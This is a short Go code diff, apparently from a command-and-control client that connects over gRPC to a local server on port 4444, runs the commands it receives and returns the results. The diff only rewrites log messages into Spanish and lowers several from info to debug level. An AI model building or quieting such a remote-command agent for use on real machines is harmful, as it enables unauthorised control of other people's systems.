@@ -21,7 +21,7 @@ func main() {
 	conn, err = grpc.NewClient("127.0.0.1:4444", opts...)
 
 	if err != nil {
-		log.Fatal(err)
+		log.Fatal("[!] No se pudo establecer conexión con el servidor principal.", "ERROR", err)
 	}
 	defer conn.Close()
 
@@ -39,7 +39,7 @@ func main() {
 			//time.Sleep(100)
 			continue
 		} else {
-			log.Info("[+] Comando recibido del servidor.", "CMD", cmd.In)
+			log.Debug("[+] Comando recibido del servidor.", "CMD", cmd.In)
 		}
 		tokens := strings.Split(cmd.In, " ")
 		var c *exec.Cmd
@@ -58,6 +58,6 @@ func main() {
 		if err != nil {
 			log.Fatal(err)
 		}
-		log.Info("[*] Resultado enviado al administrador.")
+		log.Debug("[*] Resultado enviado al administrador.")
 	}
 }
